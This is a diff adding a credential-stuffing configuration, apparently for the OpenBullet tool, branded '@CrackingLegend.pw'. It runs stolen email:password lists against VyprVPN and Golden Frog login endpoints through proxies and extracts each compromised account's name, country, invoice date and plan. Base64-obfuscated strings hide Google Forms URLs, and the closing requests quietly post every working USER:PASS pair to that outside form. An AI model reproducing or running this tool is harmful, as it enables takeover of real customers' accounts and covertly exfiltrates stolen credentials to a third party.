@@ -1,0 +1,115 @@
+[SETTINGS]
+{
+  "Name": "VyprVPN @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T10:01:36.2149458+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST GET "https://www.goldenfrog.com/api/public/auth/singleusetoken" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+  HEADER "Host: www.goldenfrog.com" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "invalid username or password" 
+
+#Token PARSE "<SOURCE>" LR "\"" "\"" -> VAR "Token" 
+
+#Request_VyprVPN REQUEST GET "https://www.vyprvpn.com/controlpanel?sul=<Token>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.goldenfrog.com" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"section vyprvpn dashboard-vypr\">" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "account is locked" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Upgrade VyprVPN" 
+
+#Request_Akun REQUEST GET "https://www.vyprvpn.com/controlpanel/account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.vyprvpn.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://Referer: https://www.vyprvpn.com/controlpanel?sul=<Token>" 
+
+#Nama PARSE "<SOURCE>" LR "Your Name: <strong>" "</strong>" -> CAP "Name" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xVTRqQTRjSm83MFFoQURBaXhKVVhTb2xGMWp6YmNTU0hldnAtRGYyTHVmZy92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Negara PARSE "<SOURCE>" LR "Country: <strong>" "</strong>" -> CAP "Country" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZTlYRmVyUU5PdURIbVFId2p6QW9QQ290cEVmb04zSlk4SDRoMTdvVDNtaElCV2hnL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Tagihan_Terakhir PARSE "<SOURCE>" LR "<strong class=\"date\">" "</strong>" -> CAP "Latest Invoice" 
+
+#Pembersihan FUNCTION ClearCookies -> VAR "Clear Cookies" 
+
+#Login_Lagi REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "User-Agent: okhttp/3.8.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTkyMDIxOTMzNT1WeXByVlBOJmVudHJ5LjE1MzIzMzg2OTk9PFVTRVI+OjxQQVNTPiZlbnRyeS4xNDEwNDIzNzkyPXxQbGFuOjxQbGFuPnwmZnZ2PTEmZHJhZnRSZXNwb25zZT0lNUJudWxsJTJDbnVsbCUyQyUyMjc0NTk1MTc5NTU2NDk5MTAzNSUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9NzQ1OTUxNzk1NTY0OTkxMDM1" -> VAR "LRU3" 
+
+#Paket PARSE "<SOURCE>" LR "\"account_level_display\": \"" "\", " -> CAP "Plan" "" " @CrackingLegend.pw" 
+
+#Cek_Status KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotContain "\"account_level\": \"" 
+  KEYCHAIN Success OR 
+    KEY "\"account_level\": \"" 
+
+#iNVOICE REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#pLAN REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
